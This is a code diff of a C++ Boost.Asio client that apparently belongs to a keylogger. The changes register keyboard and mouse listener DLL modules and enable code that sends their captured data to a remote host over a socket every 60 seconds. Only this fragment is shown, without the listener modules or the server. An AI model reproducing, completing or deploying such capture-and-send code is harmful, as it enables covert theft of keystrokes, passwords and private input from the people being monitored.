@@ -40,6 +40,8 @@ bool 		AsioClient::stop(const std::string msg) const
 AsioClient::AsioClient(boost::asio::io_service &io_service, unsigned short port): socket(io_service)
 {
   this->port = port;
+  this->modules[0x10] = new Module(OP_KEYBOARD, "KeyboardListener.dll");
+  this->modules[0x11] = new Module(OP_MOUSE, "MouseClickListener.dll");
 }
 
 AsioClient::~AsioClient()
@@ -53,7 +55,7 @@ void 		AsioClient::try_send(const std::string host)
   std::string 			message;
   boost::system::error_code 	err;
   boost::asio::streambuf	f_buf;
-  //Command			command;
+  Command			command;
   t_delays			delays;
   boost::system::error_code 	error;
 
@@ -77,20 +79,19 @@ void 		AsioClient::try_send(const std::string host)
     if (this->stop(message))
       return ;
     time(&delays.t);
-    if (((delays.sec = difftime(delays.t, mktime(&delays.time_stru))) - delays.old_sec) > 5) {
+    if (((delays.sec = difftime(delays.t, mktime(&delays.time_stru))) - delays.old_sec) > 60) {
       delays.old_sec = delays.sec;
-      /*if (command.process(this->modules, "0x04", f_buf)) {
+      if (command.process(this->modules, (char)0x10, f_buf)) {
 	boost::asio::async_write(socket, boost::asio::buffer(f_buf.data()),
 				 boost::bind(&AsioClient::handle_read_state,
 					     this, boost::asio::placeholders::error));
 
       }
-
-      if (command.process(this->modules, "0x05", f_buf)) {
+      if (command.process(this->modules, (char)0x11, f_buf)) {
 	boost::asio::async_write(socket, boost::asio::buffer(f_buf.data()),
 				 boost::bind(&AsioClient::handle_read_state,
 					     this, boost::asio::placeholders::error));
-      }*/
+      }
     }
   }
   this->socket.close();
